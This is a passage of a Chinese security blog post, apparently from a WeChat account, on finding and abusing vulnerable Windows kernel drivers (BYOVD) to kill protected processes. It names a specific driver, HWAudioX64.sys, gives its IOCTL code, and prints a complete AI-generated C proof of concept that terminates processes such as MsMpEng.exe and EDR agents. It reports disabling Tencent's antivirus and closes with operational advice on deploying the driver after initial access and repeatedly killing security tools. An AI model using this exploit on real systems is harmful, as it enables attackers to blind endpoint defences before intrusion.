YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">直接输出 I/O</span></span></strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">。与 METHOD_IN_DIRECT相反，输入数据通过 MDL 访问，输出数据则通过系统缓冲区。适用于应用程序向设备</span></span><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">输入大量数据</span></span></strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">。</span></span></p></td></tr><tr><td data-colwidth="72" width="78"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">11</span></span></p></td><td data-colwidth="117" width="178"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">METHOD_NEITHER</span></span></p></td><td data-colwidth="466" width="472"><p style="margin-top: 0px;margin-bottom: 0px;text-align: left;"><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">其他 I/O</span></span></strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">。I/O 管理器不提供任何缓冲区或 MDL，直接将用户模式的输入和输出缓冲区虚拟地址传递给驱动（通过 IrpStackLocation-&gt;Parameters.DeviceIoControl.Type3InputBuffer和 Irp-&gt;UserBuffer）。</span></span><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">性能最高，但也最危险</span></span></strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">，驱动必须在正确的进程上下文和低 IRQL 下小心访问这些地址。</span></span></p></td></tr></tbody></table>  
最常用的是缓冲 I/O 方式，识别数据传递方式是为了在逆向驱动时确认用户程序是如何将参数传递给驱动的，确认了这个才能构造POC。  
### 5、驱动与用户程序的通信  
  
为了使驱动程序能够从用户模式访问，它必须建立一个通信接口，首先通过 IoCreateDevice 创建一个设备对象，然后通过 IoCreateSymbolicLink 在内核设备名和用户可见的符号链接名之间建立映射关系，为设备创建一个用户应用程序可以引用的符号链接。  
  
设备对象充当用户进程与驱动程序功能进行交互的入口点，符号链接则充当别名，让开发人员可以通过常见的 Win32 API 在用户空间中引用设备，而无需了解内部内核命名空间。在逆向驱动程序时，如果遇到这两个函数被依次调用，就代表找到了负责将驱动程序暴露给用户模式的代码。  
## 0x03 漏洞驱动挖掘方法  
  
1、加载驱动样本  
  
在 IDA 中打开驱动文件，定位 DriverEntry 入口点。  
  
2、定位设备名称和符号链接  
  
在 DriverEntry 或其调用的初始化函数中搜索 IoCreateDevice 和 IoCreateSymbolicLink 调用，这两个 API 依次出现是驱动暴露用户模式接口的标志。记录设备名（如 \Device\xxx）和符号链接（如 \\.\xxx），后者是 PoC 中 CreateFile 要打开的目标。  
  
3、定位敏感内核 API  
  
打开 Imports 窗口，查找高风险内核函数：  
```
进程操作类：ZwTerminateProcess, ZwOpenProcess, PsTerminateProcess （最常用）；
内存操作类：MmMapIoSpace, ZwReadVirtualMemory, ZwWriteVirtualMemory；
回调操作类：PsRemoveCreateProcessNotifyRoutine, PsRemoveLoadImageNotifyRoutine；
```  
  
4、追踪调用链  
  
对敏感 API（如 ZwTerminateProcess）行交叉引用搜索，找到调用该 API 的函数，进入该函数分析其逻辑。继续向上追踪，找到调用该函数的上层函数，直至到达 IRP_MJ_DEVICE_CONTROL 处理函数  
  
5、提取 IOCTL 值  
  
在 IOCTL 处理函数中，通常会有条件判断语句（如 if 语句），提取对应的 IOCTL 数值，这是 PoC 中 DeviceIoControl 要发送的控制码。然后分析 IOCTL 对应的输入参数结构（如需要传入 PID、地址、数据长度等），用于在 POC 中构造传参。  
  
6、分析参数验证逻辑  
  
检查 IOCTL 处理函数是否对输入参数进行验证，例如缓冲区长度检查、地址范围验证、权限检查等，缺乏验证或验证不严格的地方即为漏洞点。  
  
我建议直接从   
www.loldrivers.io   
这个网站，寻找未被杀软标记的可利用驱动，会省事很多。当前很多安全产品对这种攻击手法的防御方式还停留在将驱动的哈希加黑，进行落地查杀或加载拦截的层面上。  
```
7、实战挖掘
```  
  
以驱动 HWAudioX64.sys 为例（MD5：F76031D7790ED141BE89FB1DA288CBB3）  
  
定位设备名称和符号链接  
：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SxWiaVqD6Jsn8pPU1icdiap0ict8mHuhDaFhHDWxDFbdNTjdibtWIIqa3m1MLmtTODdLqOd4c0ZpgZfK6krg9eLUX2OCChIdfbuicAYL2TT03Oc8E/640?wx_fmt=png&from=appmsg "")  
  
找到 ZwTerminateProcess 调用点：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/SxWiaVqD6JslexrITLWTuia6d2g0iax0UAZDKgHIkN6hDqhylXU3quicmR4Ov6trvAFzl9wibzWTDaazO4JdGThkLSMAcM7bottNlicc0vyKNo6B8/640?wx_fmt=png&from=appmsg "")  
  
向上找引用，发现可调用 ZwTerminateProcess 的验证逻辑：  
  
检查输入缓冲区长度 == 4；查 PID 不为特殊值（0xFFFFFFFB 过滤）。没有其他检查了，存在漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SxWiaVqD6JsmqTMIpVdOgksbYCMTjHUzcBZyFOiaIjxbVf0OMBiciciceiaMOeu965NibVI5Xiat11BSDSTF0t7yIEicZMXVSy1u2mdtQ1Q7b3JxDFpE/640?wx_fmt=png&from=appmsg "")  
  
找到疑似 IOCTL 码：  
  
0x2248DC → 001000100100100011011100  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/SxWiaVqD6JsnE6JtGEks7bkIXvxQMiaRSHE5SVD7WM00Uvfv0ibPYl0anrDAkfs4blZ5TjXJ4JBHVnK9MYBoOBQ9wXwVBRg043JyLD7BTzu5xw/640?wx_fmt=png&from=appmsg "")  
  
继续往上：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SxWiaVqD6JsmaObCXUIiamtRgQpbOickKE2e8IC7nEOogY5cB0Zt5CIXeNC1Ym4iar1LybtQFLkticmu1TQwgegZZI1Ewj3zczTFbqCXrWdHjnes/640?wx_fmt=png&from=appmsg "")  
  
继续，发现 a2 是 IRP 数据结构，到这里就可以确定我们上面找到的 a1 确实是 IOCTL 了。  
  
PID 从 IRP 的 SystemBuffer 成员中取得，SystemBuffer 内容来自用户态 DeviceIoControl 的 lpInBuffer。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SxWiaVqD6JsnOSiaYexkILiauYCwo15xgRh1hhngIaXpqpu1R26rTsoRPnZPsF0sEk4vQycQqUkiatWKnicsyCfu0jeRhY6nvlcZpBPk50icHADeg/640?wx_fmt=png&from=appmsg "")  
  
IOCTL 的二进制最后两位是00，  
定义为使用缓冲 I/O（METHOD_BUFFERED） 方式传递数据，所以使用的是 AssociatedIrp.SystemBuffer ，这个结构是 DeviceIoControl 函数中由应用程序提供的输入缓冲区数据在内核地址空间中的副本。也就是说只要在用户态的应用程序中向 DeviceIoControl 函数的缓冲区数据参数中传入进程 pid，就能被驱动接收正确的参数。  
```
DeviceIoControl(
        hDevice,              // 设备句柄
        IOCTL_TERMINATE_CODE, // IO控制码
        &pid, sizeof(pid),    // 输入缓冲区（进程PID）    
        nullptr, 
        0,                   // 输出缓冲区（无）
        &bytesReturned,      // 返回字节数
        nullptr              // 无重叠操作
    )
```  
## 0x04 PoC 编写流程  
  
编写漏洞驱动 PoC 的核心步骤，以终止进程类驱动为例：  
  
1、定义常量  
  
设备符号链接：  
```
#define DEVICE "\\\\.\\DeviceName"
```  
```
IOCTL 控制码：
```  
```
#define IOCTL_TERMINATE 0x22E044（从逆向分析中提取）
```  
```
2、打开设备句柄

```  
  
使用 CreateFile / CreateFileA 打开驱动的符号链接：  
```
HANDLE hDevice = CreateFileA(
  DEVICE,
  GENERIC_READ | GENERIC_WRITE,
  0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
);
```  
  
3、构造输入缓冲区  
  
根据逆向分析确定参数结构，常见形式：  
```
终止进程：传入 DWORD 类型的 PID
内存读写：传入地址 + 数据 + 长度
多参数情况：定义结构体封装
```  
```
4、发送 IOCTL 请求
```  
  
使用 DeviceIoControl 发送控制码和参数：  
```
BOOL result = DeviceIoControl(
    hDevice,
    IOCTL_TERMINATE,        // 控制码
    &pid, sizeof(pid),      // 输入缓冲区
    NULL, 0,                // 输出缓冲区（如不需要）
    &bytesReturned, NULL
);
```  
```
5、清理资源
```  
  
 CloseHandle(hDevice) 关闭设备句柄  
## 0x05 AI 辅助漏洞挖掘  
  
我用的是 Claudecode+GLM5，将驱动漏洞挖掘的方法论、其他互联网上的公开资料、POC编写流程等，发给 AI，让它生成一个 BYOVD-Hunt 的 Skill，人工进行简单的优化：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/SxWiaVqD6JsmWnhXbRnzwg3OKsCWRMofic4BcjRD2P9HDDNfElPO8MiaWef5XxoEK0VG5iaZe6E7lQTQQlC68PNVnicwAa4Hm1iaNEoGQNz2nA9mg/640?wx_fmt=png&from=appmsg "")  
  
该 skill 能判断一个驱动是否存在漏洞，且能挖掘到漏洞利用方法并生成 POC 。使用前提是目标驱动已被加载到 IDA 且开启了 IDA MCP 服务（使用流程自行搜索）。  
  
跟上面同样的驱动，让它进行漏洞挖掘，以下是挖掘过程：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/SxWiaVqD6Jskrut7ZJU9LUFibPp1QEib7r993EFDicvFyvaA2EicFAWdxE4iaicOR1d0jGBZ8XIMxpWhyWvvrQ8KCShggcH2lWCg2F94kQjdXNqRfY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/SxWiaVqD6JsnpSsj3wET6ryWR0vCeico2icRzsPzRKHlH6gHA5j4o95e4fhXkr7ibALLTMUnDbqxrZGh1icNicbcaS4a6WttA87hic8kgjwcEycP7c/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SxWiaVqD6Jsls0a4lZ4PkpApaxT47ibJvK7zuSiazPKk6q0C6NDibuB4cZjHfjGRsPdmBuicqcH2spTJU0twlroymUCDeIN3TqsmugbUnjbtYtCg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SxWiaVqD6JskNF27kwZup5dJdEgDWGHe5QpqDa8CE7z5jwNLHHWq6c3cZX9gXtNZtTXrErwhXn8wLYialUBl4y4Q3hzMuURXwibib8egRyBjgaA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/SxWiaVqD6JsnncXiaaT6vUG9lmTGDEL41m1Fzibw3ibHVskYErUYgQyK9cmZVDhOKiaib62EibGXKibRrILTIvwe91M2lxlPjicSkc3EljAiaSWNZZZZc/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SxWiaVqD6Jslvu4fVQtI5E2caNEFibQEib3hSydpB1Fk6YlibmW3mjguQicoAuyicXwLzcWog59zB0FORq0picsnyjLocVJpWGicTMxVuMxQVOGup9E/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/SxWiaVqD6JsmlLxoFM90oFIOaomQQm0VTlhV1BZf45968J9PibozZNtUEDIz969lDUFu3WmMToJbEYCXokPwM9KlYBf9YV6sELx5oLSL184P4/640?wx_fmt=png&from=appmsg "")  
  
挖掘速度很快，识别到的 IOCTL 码和传参方式也都正确。以下是 AI 生成的 POC ：  
```
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
// ===== 从逆向分析提取的常量 =====
#define DEVICE_NAME     "\\\\.\\HWAudioX64"
#define IOCTL_TERMINATE 0x2248DC
// ===== 辅助函数：通过进程名查找PID =====
DWORD FindProcessByName(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return 0;
}
// ===== 辅助函数：列出可终止的目标进程 =====
void ListPotentialTargets() {
    printf("\n[*] 常见可终止的目标进程:\n");
    printf("    - notepad.exe (测试用)\n");
    printf("    - calc.exe (测试用)\n");
    printf("    - csrss.exe (系统关键进程 - 警告!)\n");
    printf("    - lsass.exe (系统关键进程 - 警告!)\n");
    printf("    - wininit.exe (系统关键进程 - 警告!)\n");
    printf("    - MsMpEng.exe (Windows Defender)\n");
    printf("    - EDR相关进程...\n");
}
// ===== 核心功能：终止进程 =====
BOOL TerminateProcessByIOCTL(HANDLE hDevice, DWORD pid) {
    DWORD bytesReturned = 0;
    DWORD inputPid = pid;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_TERMINATE,
        &inputPid, sizeof(inputPid),   // 输入: PID (4字节)
        NULL, 0,                        // 输出: 无
        &bytesReturned,
        NULL
    );
    return result;
}
int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("HWAudioDevX64.sys BYOVD PoC\n");
    printf("IOCTL: 0x%X\n", IOCTL_TERMINATE);
    printf("========================================\n\n");
    // 1. 打开设备
    printf("[+] Step 1: Opening device %s\n", DEVICE_NAME);
    HANDLE hDevice = CreateFileA(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hDevice == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        printf("[-] Failed to open device: Error %d (0x%X)\n", err, err);
        if (err == ERROR_FILE_NOT_FOUND) {
            printf("    [!] Driver not loaded or device not found\n");
            printf("    [!] Try: sc create HWAudio binPath= \"C:\\path\\to\\HWAudioDevX64.sys\" type= kernel\n");
            printf("    [!] Then: sc start HWAudio\n");
        } else if (err == ERROR_ACCESS_DENIED) {
            printf("    [!] Access denied - need Administrator privileges\n");
        }
        return 1;
    }
    printf("[+] Device opened successfully: Handle 0x%p\n\n", hDevice);
    // 2. 获取目标PID
    DWORD targetPid = 0;
    if (argc > 1) {
        // 从命令行参数获取
        if (strcmp(argv[1], "-n") == 0 && argc > 2) {
            // 通过进程名查找
            targetPid = FindProcessByName(argv[2]);
            if (targetPid == 0) {
                printf("[-] Process '%s' not found\n", argv[2]);
                CloseHandle(hDevice);
                return 1;
            }
            printf("[+] Found process '%s' with PID: %u\n", argv[2], targetPid);
        } else {
            // 直接使用PID
            targetPid = atoi(argv[1]);
        }
    } else {
        // 交互式输入
        printf("[+] Step 2: Specify target process\n");
        printf("    Usage:\n");
        printf("      %s <PID>          - Terminate by PID\n", argv[0]);
        printf("      %s -n <name>      - Terminate by process name\n", argv[0]);
        printf("      %s -l             - List potential targets\n", argv[0]);
        ListPotentialTargets();
        printf("\nEnter target PID: ");
        scanf("%u", &targetPid);
    }
    if (targetPid == 0) {
        printf("[-] Invalid PID: 0\n");
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Target PID: %u (0x%X)\n\n", targetPid, targetPid);
    // 安全警告
    if (targetPid < 100) {
        printf("[!] WARNING: Low PID detected - may be a system process!\n");
        printf("[!] Terminating critical processes may cause BSOD!\n");
        printf("[!] Continue? (y/n): ");
        char confirm;
        scanf(" %c", &confirm);
        if (confirm != 'y' && confirm != 'Y') {
            printf("[*] Cancelled\n");
            CloseHandle(hDevice);
            return 0;
        }
    }
    // 3. 发送 IOCTL 终止进程
    printf("[+] Step 3: Sending IOCTL 0x%X with PID %u\n", IOCTL_TERMINATE, targetPid);
    BOOL result = TerminateProcessByIOCTL(hDevice, targetPid);
    if (result) {
        printf("[+] IOCTL sent successfully!\n");
        printf("[+] Process %u should be terminated\n\n", targetPid);
        // 验证进程是否已终止
        HANDLE hCheck = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
        if (hCheck == NULL) {
            printf("[+] Verified: Process %u no longer exists\n", targetPid);
        } else {
            printf("[?] Process %u still exists - termination may have failed silently\n", targetPid);
            CloseHandle(hCheck);
        }
    } else {
        DWORD err = GetLastError();
        printf("[-] DeviceIoControl failed: Error %d (0x%X)\n", err, err);
        printf("    Possible reasons:\n");
        printf("    - PID invalid or process already terminated\n");
        printf("    - Input buffer size mismatch\n");
        printf("    - Driver internal error\n");
    }
    // 4. 关闭设备句柄
    printf("\n[+] Step 4: Closing device handle\n");
    CloseHandle(hDevice);
    printf("[+] Handle closed\n");
    printf("\n========================================\n");
    printf("PoC execution completed\n");
    printf("========================================\n");
    return result ? 0 : 1;
}
```  
```
0x06 利用验证
```  
  
编译POC，进行利用测试。以腾讯电脑管家为例，我个人电脑只装了这个，经过测试对其他商用 EDR 也有效。正常情况无法直接终止电脑管家的实时防护进程，有保护：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SxWiaVqD6JsklIfqaibh8ralfMogVdZyLRpFQk40uBIYS7h50OgxM8OSVjyrhibdqFicC7djov5uaYKvSiaLeCqmyNGmsMVrWiahVRDdYurNbJTa8/640?wx_fmt=png&from=appmsg "")  
  
安装驱动，查询目标进程pid：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SxWiaVqD6JsnOdIqdTE9zibQOvQAsicRC9ZdqmG4UgrrTkLiaticYDR3ddrEBxLRCOiczyUpkvcW7RSRCREZNibdt09EErPlK6icj6Y2R5aC5awVZP8/640?wx_fmt=png&from=appmsg "")  
  
使用 POC 程序测试，终止进程成功，电脑管家实时防护进程退出，只剩了托盘进程：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/SxWiaVqD6JsmHHWSP0Gz9FMlSJbACkicYAEqD5wtH6MuKcmlkcefBZXz8VgHuqialHToFqss8SaibC6ZqcjhkTxBZfBcwzACeqQUAJM2c9pu628/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SxWiaVqD6JsmlW6jER3pg2lV6ibO7pfEEuICb77jE5INjUIpLsKibHicNiaCLrbHNVbKlniauZtrxUg6eJmFTY3sQRg4aBSGdTKLSxDIn7pZpyskc/640?wx_fmt=png&from=appmsg "")  
  
写在最后  
  
在实战过程中，需要先获得目标系统的初始访问权限，将准备好的漏洞驱动文件和利用程序上传至目标机器进行利用，或直接将驱动文件和利用逻辑包装在冲锋样本中。最好利用自写程序通过 Windows 服务控制管理器（SCM）等合法接口加载漏洞驱动（注册驱动服务、启动服务），循环 kill 目标进程。  
  
  
最后，AI 真好用^_^  
  
  
**注：本文内容仅用于研究学习，不可用于网络攻击等非法行为，否则造成的后果均与本文作者和本公众号无关，维护网络安全人人有责~**  
  
****  
**一起当保安，少走30年弯路 ↓↓↓**  
  
  
  
  
